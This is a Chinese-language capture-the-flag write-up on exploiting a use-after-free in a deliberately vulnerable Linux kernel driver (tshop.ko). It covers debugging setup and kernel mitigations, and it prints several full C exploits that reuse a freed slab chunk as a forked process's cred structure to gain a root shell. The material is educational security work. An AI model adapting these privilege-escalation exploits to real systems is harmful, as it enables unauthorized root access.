# Linux Kernel 初探（一）BabyKernel

阅读量 **386121**

|评论 **3**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-05-29 11:02:14

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

## 写在前面

这篇博客是记录入门 Linux kernel 的心得和体会，一直以来对内核知识都较为感兴趣，下面就开始第一个 kernel pwn 的旅程（题目来自于
TSCTF 天枢-17）

## 相关链接

【+】题目：<https://drive.google.com/open?id=1B5EKTB3c2sYHg26f_tvxejrP0HFzj1Qi>  
【+】 <https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/basic_knowledge/>  
【+】 <http://p4nda.top>  
【+】 <https://sunichi.github.io>

## 题目描述

解压[题目](https://drive.google.com/open?id=1B5EKTB3c2sYHg26f_tvxejrP0HFzj1Qi)我们可以拿到以下文件:

    
    
    p1umer@ubuntu:~/kernel/give_to_player$ ls -l
    total 5516
    -rwxr-xr-x 1 p1umer p1umer     202 May  9 00:09 boot.sh
    -rw-r--r-- 1 p1umer p1umer 4127776 May  9 00:09 bzImage
    -rw-r--r-- 1 p1umer p1umer 1514482 May  9 04:35 initramfs.img
    

将initramfs.img后缀改为.cpio后用ubuntu再次解压可以得到如下文件：

![](https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190515013157.png)

在poc文件夹内找到tshop.ko文件，使用IDA分析：

![](https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190515013311.png)

其中可以观察到，主要函数有三个：

  * tshop-ioctl
  * tshop-init
  * tshop-exit

其中核心函数是 tshop-ioctl 需要重点分析，我们后面会具体分析这个函数

## 调试以及数据交互

###  程序启动以及调试

题目包含了一个 qemu 的启动脚本如下：

    
    
    #!/bin/sh
    qemu-system-x86_64 
        -kernel bzImage 
        -nographic 
        -append "rdinit=/linuxrc console=ttyS0 oops=panic panic=1" 
        -m 128M 
        -cpu qemu64,smap,smep -initrd initramfs.img 
        -smp cores=1,threads=1 2>/dev/null 
    

可以看到其中如果选择开启kaslr则需要在 -append 选项后面加上kaslr即可

如果选择gdb调试，则需要加上：`-gdb tcp::4869 -S` （其中-S为挂起等待），对应的gdb脚本：

    
    
    gdb 
        -ex "add-auto-load-safe-path $(pwd)" 
        -ex "file vmlinux" 
        -ex 'set arch i386:x86-64:intel' 
        -ex 'target remote localhost:4869' 
        -ex 'continue' 
        -ex 'disconnect' 
        -ex 'set arch i386:x86-64' 
        -ex 'target remote localhost:4869'
    

###  EXP编写以及数据交互

Kernel Pwn 如何和驱动模块进行交互呢？

驱动处理预期流程是：

  * 用户态调用驱动触发状态切换
  * 进入内核态内核态响应用户请求
  * 处理数据返回结果
  * 切换回用户态

那么如何在用户态调用驱动呢？

首先，对一个字符设备而言有如下结构体：

    
    
    struct file_operations d_fops = {
        .owner = THIS_MODULE,
        .open = d_open,
        .read = d_read,
        .write = d_write,
        .ioctl = d_ioctl,
        .release = d_release,
        };
    

该结构体展示了部分文件操作对应的函数指针。如读该设备时会调用d_open函数。从该结构体我们可以看出其实现了用户与内核驱动交互的接口，同时也就自然成为了内核攻击面之一。具体的调用方法为：

    
    
    int main(int argc, char *argv[]){
        int fd = open("/dev/tshop",0);
        //debug();
        ioctl(fd,MALLOC,0);
        }
    

  * fd打开设备
  * 通过ioctl进行具体的交互（或者该驱动注册的其他处理函数）

好了，可以实现和驱动模块的交互后，我们就可以用c语言来编写相应的exploit了。但是在这之前，我们先了解一下内核的一些保护模式

## 缓释机制

###  mmap_min_addr

指定用户进程通过mmap可使用的最小虚拟内存地址，以避免其在低地址空间产生映射导致安全问题。

###  kptr_restrict / dmesg_restrict

在linux内核漏洞利用中常常使用commit_creds和prepare_kernel_cred来完成提权，它们的地址可以从/proc/kallsyms中读取。/proc/sys/kernel/kptr_restrict被默认设置为1以阻止通过这种方式泄露内核地址。dmesg_restrict限制非特权读dmesg（Restrict
unprivileged access to kernel syslog）

###  SMEP/SMAP

SMEP(Supervisor Mode Execution Prevention，管理模式执行保护)和SMAP(Supervisor Mode
Access Prevention，管理模式访问保护)，其作用分别是禁止内核执行用户空间的代码和禁止内核访问用户空间的数据。

## 程序分析

前面提到，ida打开.ko文件得到如下内容：

![](https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190515013340.png)

可以得到如下信息：

  * 程序实现了kmalloc；kfree；edit1；edit2
  * 程序维护了一个BUY_LIST用来存放kmen_cache_alloc分配的堆块
  * malloc的时候会把堆块写成特定值
  * 两个edit函数改指针为固定值
  * 有一个看起来没有参数的 kfree

等等，kfree没有参数？让我们仔细分析它：

![](https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190515013412.png)

嗯，参数还是有的。但是这里面在释放完毕BUY_LIST里的堆块之后并没有清空，也就是说我们得到了一个UAF!

## 调试判断 Cred 结构体大小

若要达到提权权限，则需要修改权限信息。kernel记录了线程的权限，更具体的，是用 cred
结构体记录的，每个线程中都有一个cred结构，这个结构保存了该进程的权限等信息（uid，gid等），如果能修改某个进程的cred，那么也就修改了这个进程的权限。所以我们需要得到Cred结构体大小，以便为后面的
exploit 拓展思路。

首先打开源码查看cred结构体定义

    
    
    struct cred {
        atomic_t    usage;
    #ifdef CONFIG_DEBUG_CREDENTIALS
        atomic_t    subscribers;    /* number of processes subscribed */
        void        *put_addr;
        unsigned    magic;
    #define CRED_MAGIC    0x43736564
    #define CRED_MAGIC_DEAD    0x44656144
    #endif
        uid_t        uid;        /* real UID of the task */
        gid_t        gid;        /* real GID of the task */
        uid_t        suid;        /* saved UID of the task */
        gid_t        sgid;        /* saved GID of the task */
        uid_t        euid;        /* effective UID of the task */
        gid_t        egid;        /* effective GID of the task */
        uid_t        fsuid;        /* UID for VFS ops */
        gid_t        fsgid;        /* GID for VFS ops */
        unsigned    securebits;    /* SUID-less security management */
        kernel_cap_t    cap_inheritable; /* caps our children can inherit */
        kernel_cap_t    cap_permitted;    /* caps we're permitted */
        kernel_cap_t    cap_effective;    /* caps we can actually use */
        kernel_cap_t    cap_bset;    /* capability bounding set */
    #ifdef CONFIG_KEYS
        unsigned char    jit_keyring;    /* default keyring to attach requested
                         * keys to */
        struct key    *thread_keyring; /* keyring private to this thread */
        struct key    *request_key_auth; /* assumed request_key authority */
        struct thread_group_cred *tgcred; /* thread-group shared credentials */
    #endif
    #ifdef CONFIG_SECURITY
        void        *security;    /* subjective LSM security */
    #endif
        struct user_struct *user;    /* real user ID subscription */
        struct user_namespace *user_ns; /* cached user->user_ns */
        struct group_info *group_info;    /* supplementary groups for euid/fsgid */
        struct rcu_head    rcu;        /* RCU deletion hook */
    };
    

emmm，直接判断大小貌似有点困难，调试一下好了。

注意,由于系统开启了kptr_restrict，我们无法看到一些地址信息，所以我们需要关闭。

【关闭 kptr_restrict】：修改解压后的 /etc/.init/rcS 文件中的

`echo 1 > /proc/sys/kernel/kptr_restrict` 为 `echo 0 >
/proc/sys/kernel/kptr_restrict`

这时候就可以得到一些我们感兴趣的地址：

【kmem_cache_alloc】：`cat /proc/kallsyms |grep kmem_cache_alloc`

【kfree】：`cat /proc/kallsyms |grep kfree`

【prepare_cred】：`cat /proc/kallsyms | grep prepare_cred`

【tshop的bss地址】：`cat /sys/module/tshop/sections/.bss`

另外，我们在用户态执行fork函数的时候，可以调用内核prepare_cred来创建cred结构体提供给新进程的新线程。

所以我们编写一个简单的demo.c:

    
    
    /*
     * main.c
     * Copyright (C) 2019 P1umer <cz18811105578@gmail.com>
     *
     */
    // gcc exp.c -o exp --static -lpthread
    #define _GNU_SOURCE
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <sys/ioctl.h>
    #include <string.h>
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <fcntl.h>
    #include <sys/mman.h>
    #include <poll.h>
    #include <pthread.h>
    #include <errno.h>
    #include <stdlib.h>
    #include <signal.h>
    #include <string.h>
    #include <sys/syscall.h>
    #include <linux/userfaultfd.h>
    #include <pthread.h>
    #include <poll.h>
    #include <linux/prctl.h>
    #include <stdint.h>
    
    
    #define MALLOC 0x271A
    #define FREE   0x2766
    #define EDIT1  0x1A0A
    #define EDIT2  0x22B8 
    pid_t pid;
    
    
    void debug(){
        getchar();
    }
    
    int main(int argc, char *argv[]){
        int fd = open("/dev/tshop",0);
        debug();
        ioctl(fd,MALLOC,0);
        fork()；
    }
    

【编译】：`gcc exp.c -o exp --static -lpthread`

【打包】：打包命令为：`find . | cpio -o --format=newc > ../initramfs.img`

值得注意的是，我们因为调试的是内核，在内核中有很多的kmem_cache_alloc && prepare_cred && kfree
调用，因此我们只希望在 poc 调用内核这些函数的时候进行下断调试，因此getchar()是必要的。

启动 gdb+qemu 调试，断在 prepare_cred：

![](https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190515182753.png)

调用了`0xffffffff810d3251`，查看函数名：

    
    
    $ cat /proc/kallsyms | grep "ffffffff810d3251" 
    ffffffff810d3251 T kmem_cache_alloc
    

可以看到 prepare_cred 函数实际调用了 kmem_cache_alloc 来申请cred的空间，大小通过 $rsi 传参，为
0xd0。惊奇的发现，居然和我们ioctl操作中kmem_cache_alloc申请的大小一致 🙂

## Exploit

上面提到有了一个UAF并且cred结构体大小和驱动malloc操作申请的堆块大小一致，那么接下来的事情就好办多了，在这之前先了解一下kernel里面的memory_management：

【+】<http://www.wowotech.net/memory_management/247.html>

slab分配器的管理手段类似于 Glibc 中的 FastbinY。如果free链表内的chunk大小和该内核版本的 cred
结构体大小相同，那么会把free链表中的chunk解链返回给 cred。

于是我们就可以通过doublefree来进行提权：

  * doublefree
  * 得到cred结构体后通过两次malloc修改cred结构体中的值为特定的值（上面的ida分析有提到），恰好可以达到 root 要求

这个地方遇到了一点困难：由于驱动的堆内存和内核的内存是共享的，在得到 cred 的同时会把cred的信息写入该内存，也就是说

  * 在我们准备doublefree之前：  

  * 把cred写入最末尾的chunk  

内核下一次申请的时候就会申请到非法地址，PANIC!

但是如果我们在系统申请非法地址之前讲free链表扩充到足够大是不是就可以让系统迟一点申请到非法地址呢? 我们来试一试：

编写exp.c(ugly code):

    
    
    /*
     * main.c
     * Copyright (C) 2019 P1umer <cz18811105578@gmail.com>
     *
     */
    // gcc exp.c -o exp --static -lpthread
    #define _GNU_SOURCE
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <sys/ioctl.h>
    #include <string.h>
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <fcntl.h>
    #include <sys/mman.h>
    #include <poll.h>
    #include <pthread.h>
    #include <errno.h>
    #include <stdlib.h>
    #include <signal.h>
    #include <string.h>
    #include <sys/syscall.h>
    #include <linux/userfaultfd.h>
    #include <pthread.h>
    #include <poll.h>
    #include <linux/prctl.h>
    #include <stdint.h>
    
    
    #define MALLOC 0x271A
    #define FREE   0x2766
    #define EDIT1  0x1A0A
    #define EDIT2  0x22B8 
    pid_t pid;
    
    
    void debug(){
        getchar();
    }
    
    int main(int argc, char *argv[]){
        int fd = open("/dev/tshop",0);
        debug();
    
        ioctl(fd,MALLOC,0);
        ioctl(fd,MALLOC,1);
        ioctl(fd,MALLOC,2);
        ioctl(fd,MALLOC,3);
        ioctl(fd,MALLOC,4);
        ioctl(fd,MALLOC,5);
        ioctl(fd,MALLOC,6);
        ioctl(fd,MALLOC,7);
        ioctl(fd,MALLOC,8);
        ioctl(fd,MALLOC,9);
        ioctl(fd,MALLOC,10);
        ioctl(fd,MALLOC,11);
        ioctl(fd,MALLOC,12);
        ioctl(fd,MALLOC,13);
        ioctl(fd,MALLOC,14);
        ioctl(fd,MALLOC,15);
        ioctl(fd,MALLOC,16);
        ioctl(fd,MALLOC,17);
    
        ioctl(fd,FREE,17);
        ioctl(fd,FREE,16);
        ioctl(fd,FREE,17);
    
        pid=fork();
        if(pid==0){
            printf("[+] root?");
            system("whoami");
        }else{
                ioctl(fd,MALLOC,16);
                ioctl(fd,MALLOC,17);//cred==0 
    
                ioctl(fd,FREE,0);
                ioctl(fd,FREE,1);
                ioctl(fd,FREE,2);
                ioctl(fd,FREE,3);
                ioctl(fd,FREE,4);
                ioctl(fd,FREE,5);
                ioctl(fd,FREE,6);
                ioctl(fd,FREE,7);
                ioctl(fd,FREE,8);
                ioctl(fd,FREE,9);
                ioctl(fd,FREE,10);
                ioctl(fd,FREE,11);
                ioctl(fd,FREE,12);
                ioctl(fd,FREE,13);
                ioctl(fd,FREE,14);
                ioctl(fd,FREE,15);
        }
    }
    

输出结果：

![](https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190515013511.png)

貌似已经提权成功了。这种方法确实奏效，但是当我多执行一些指令的时候内核又会panic 🙁

怎么办呢？

## Exploit 加固

由于panic的核心原因在于把 cred info 当作地址来申请堆块，那么在这个方向思考的话，其实可以通过一个free的写指针操作把 cred info
覆盖为一个有效的 chunk 地址，也就是free链表的尾 chunk 地址。

    
    
    /*
     * main.c
     * Copyright (C) 2019 P1umer <cz18811105578@gmail.com>
     */
    // gcc exp.c -o exp --static -lpthread
    #define _GNU_SOURCE
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <sys/ioctl.h>
    #include <string.h>
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <fcntl.h>
    #include <sys/mman.h>
    #include <poll.h>
    #include <pthread.h>
    #include <errno.h>
    #include <stdlib.h>
    #include <signal.h>
    #include <string.h>
    #include <sys/syscall.h>
    #include <linux/userfaultfd.h>
    #include <pthread.h>
    #include <poll.h>
    #include <linux/prctl.h>
    #include <stdint.h>
    
    
    #define MALLOC 0x271A
    #define FREE   0x2766
    #define EDIT1  0x1A0A
    #define EDIT2  0x22B8 
    pid_t pid;
    
    void debug(){
        getchar();
    }
    
    int main(int argc, char *argv[]){
        int fd = open("/dev/tshop",0);
        debug();
        ioctl(fd,MALLOC,0);
        ioctl(fd,MALLOC,1);
        ioctl(fd,MALLOC,2);
        ioctl(fd,MALLOC,3);
        ioctl(fd,MALLOC,4);
        ioctl(fd,MALLOC,5);
        ioctl(fd,MALLOC,6);
        ioctl(fd,MALLOC,7);
        ioctl(fd,MALLOC,8);
        ioctl(fd,MALLOC,9);
        ioctl(fd,MALLOC,10);
        ioctl(fd,MALLOC,11);
        ioctl(fd,MALLOC,12);
        ioctl(fd,MALLOC,13);
        ioctl(fd,MALLOC,14);
        ioctl(fd,MALLOC,15);
        ioctl(fd,MALLOC,16);
        ioctl(fd,MALLOC,17);
    
        ioctl(fd,FREE,17);
        ioctl(fd,FREE,16);
        ioctl(fd,FREE,17);
    
        pid=fork();
    
        if(pid==0){
            sleep(1);
            printf("[+] root");
            system("whoami");
            system("/bin/sh");
        }else{
    
            printf("[+] shell close");
            ioctl(fd,FREE,17);
            ioctl(fd,MALLOC,17);
    
            ioctl(fd,MALLOC,16);
            ioctl(fd,MALLOC,17);//cred==0 
    
            ioctl(fd,FREE,0);
            ioctl(fd,FREE,1);
            ioctl(fd,FREE,2);
            ioctl(fd,FREE,3);
            ioctl(fd,FREE,4);
            ioctl(fd,FREE,5);
            ioctl(fd,FREE,6);
            ioctl(fd,FREE,7);
            ioctl(fd,FREE,8);
            ioctl(fd,FREE,9);
            ioctl(fd,FREE,10);
            ioctl(fd,FREE,11);
            ioctl(fd,FREE,12);
            ioctl(fd,FREE,13);
            ioctl(fd,FREE,14);
            ioctl(fd,FREE,15);
            sleep(100);
    
        }
    }
    

主进程通过 UAF 再次把 chunk17 free 了一次，复写里面的Cred info 为 chunk16
的地址，然后再次申请堆块把链表恢复为原状态。同时在父进程中加了sleep函数提高稳定性。

这时候已经得到了稳定的 root shell 🙂

![](https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190515013535.png)

## 更多的思考

还有一种更为精简的解法, 从一开始没有考虑 doublefree ：

    
    
    #include <stdio.h>
    #include <pthread.h>
    #include <unistd.h>
    #include <stdlib.h>
    #include <sys/ioctl.h>
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <fcntl.h>
    
    #define DEL         0x2766
    #define SET_ZEGE     0x22B8  // 0x123456789ABCDEF0LL
    #define ALLOC         0x271A
    #define SET_JIGE     0x1A0A  // 0xFEDCBA987654321LL
    
    
    int main() {
        int fd = open("/dev/tshop", 0);
        size_t heap_addr , kernel_addr,mod_addr;
        if (fd < 0) {
            printf("[-] bad open /dev/tshopn");
            exit(-1);
        }
    
        ioctl(fd, ALLOC, 0);
        ioctl(fd, ALLOC, 1);
        ioctl(fd, DEL, 0);
        ioctl(fd, DEL, 1);
        int pid=fork();
        ioctl(fd, DEL, 1);
        ioctl(fd, ALLOC, 3);
        //getchar();
        //getchar();
        if (pid < 0) {
            puts("[-] fork error!");
            exit(0);
        } else if (pid == 0) {
            if (getuid() == 0) {
                puts("[+] root");
                system("cat /home/sunichi/flag");
                system("id");
                system("/bin/sh")
                exit(0);
            }
        } else {
            sleep(30);
            puts("[+] parent exit");
        }
    }
    

具体思路：

  * alloc并free掉两块内存，使他们接入slab cache链表的尾部，这里暂且给它编号为chunk0和chunk1
  * 由于采用FIFO算法，此时slab缓存的单向链表最尾端的chunk为chunk1，而且第一个8字节存储的是指向chunk0的指针，当ALLOC新cache时，将优先取出chunk1分配给进程。
  * fork一个子进程，这个子进程的cred结构体会复用此前我们free掉的内存块（chunk1）  
此时，堆块中的cred如下：  

  * 我们的目标是将cred的id位置零，首先就需要再次拿到cred所在堆块（chunk1）
  * free并立即进行alloc操作，chunk1就会挂到cache链上后再次被申请回来。
  * 由于ALLOC操作伴随着所在堆块数据的初始化，于是我们不用再有多余的操作便能将cred结构体uid及gid位置零。此时子进程就已成功提权（root）  

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **P1umer** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/179161](/post/id/179161)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)
  * [CTF](/tag/CTF)
  * [Kernel](/tag/Kernel)

 **+1** __14赞

 __收藏

![](https://p4.ssl.qhimg.com/t01334166ae59dccfa2.png) P1umer

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

